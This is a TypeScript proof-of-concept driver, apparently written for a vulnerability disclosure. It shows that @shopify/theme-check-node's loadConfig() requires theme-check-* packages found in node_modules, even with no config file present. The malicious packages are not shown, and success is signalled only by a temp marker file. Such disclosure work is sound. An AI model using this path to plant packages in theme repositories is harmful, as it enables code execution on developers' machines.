/**
 * T4 PoC driver (portable): proves @shopify/theme-check-node executes require()'d code from
 * node_modules/theme-check-* found by auto-glob, with NO .theme-check.yml present.
 *
 * Usage:
 *   npx -y tsx@4.19.2 run-poc.ts <path-to-cloned-theme-tools-repo>
 *   (env fallback: THEME_TOOLS_PATH)
 */
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { pathToFileURL } from 'node:url';

const TOOLS_ROOT = process.argv[2] || process.env.THEME_TOOLS_PATH;
const POC_ROOT = __dirname; // resolved by tsx; this repo root (contains .git after clone)
const VICTIM_A = path.join(POC_ROOT, 'malicious-theme'); // has its own node_modules/theme-check-evil
const VICTIM_B = path.join(POC_ROOT, 'plain-theme'); // no node_modules; walks up to repo root (.git + node_modules/theme-check-evil-up)
const MARKER = path.join(os.tmpdir(), 'theme_rce_marker_1337.txt');

async function main() {
  console.log('=== T4 PoC: theme-check-node auto-glob RCE ===');
  console.log('[env] node=' + process.version + ' cwd=' + process.cwd());
  console.log('[env] driver=' + __filename);

  if (!TOOLS_ROOT) {
    console.error('[driver] missing theme-tools path. Usage: npx -y tsx@4.19.2 run-poc.ts <path-to-theme-tools>');
    process.exit(1);
  }
  const srcIndex = path.join(TOOLS_ROOT, 'packages', 'theme-check-node', 'src', 'index.ts');
  if (!fs.existsSync(srcIndex)) {
    console.error('[driver] theme-check-node source not found at: ' + srcIndex);
    console.error('[driver] Did you clone theme-tools and use its root as the argument?');
    process.exit(1);
  }

  // 0) assert victim dirs contain no .theme-check.yml
  for (const dir of [VICTIM_A, VICTIM_B, POC_ROOT]) {
    const cfg = path.join(dir, '.theme-check.yml');
    const exists = fs.existsSync(cfg);
    console.log(`[assert] no-config-file check: ${cfg} exists=${exists} (must be false)`);
    if (exists) throw new Error('.theme-check.yml unexpectedly present: ' + cfg);
  }

  // clean marker before run
  if (fs.existsSync(MARKER)) fs.unlinkSync(MARKER);
  console.log('[setup] marker cleared: ' + MARKER);

  // dynamic import from the audited theme-tools source
  const { loadConfig } = await import(pathToFileURL(srcIndex).href);

  // 1) Scenario A: victim theme with committed node_modules/theme-check-evil
  console.log('\n--- Scenario A: loadConfig(undefined, malicious-theme) ---');
  console.log('[driver] >>> calling public loadConfig() ... any PWN output below is from require() during auto-glob');
  const cfgA = await loadConfig(undefined, VICTIM_A);
  console.log('[driver] <<< loadConfig(A) returned normally; checks count=' + cfgA.checks.length);
  const hitA = fs.existsSync(MARKER);
  console.log('[driver] after scenario A: marker exists=' + hitA);

  // 2) Scenario B: victim theme without node_modules; findNodeModuleRoot walks up
  //    to repo root because it contains .git (+ node_modules/theme-check-evil-up)
  console.log('\n--- Scenario B: loadConfig(undefined, plain-theme) [upward walk to .git/node_modules parent] ---');
  console.log('[driver] >>> calling public loadConfig() ...');
  const cfgB = await loadConfig(undefined, VICTIM_B);
  console.log('[driver] <<< loadConfig(B) returned normally; checks count=' + cfgB.checks.length);
  const hitB = fs.existsSync(MARKER);

  // 3) verdict
  console.log('\n=== VERDICT ===');
  console.log('[verdict] scenario A marker exists = ' + hitA);
  console.log('[verdict] scenario B marker exists = ' + hitB);
  if (fs.existsSync(MARKER)) {
    console.log('[verdict] marker content:');
    console.log(fs.readFileSync(MARKER, 'utf8'));
  }
  console.log('[verdict] RCE = ' + (hitA || hitB ? 'CONFIRMED' : 'NOT REPRODUCED'));
}

main()
  .then(() => process.exit(0))
  .catch((e) => {
    console.error('[driver] FAILED:', e);
    process.exit(1);
  });
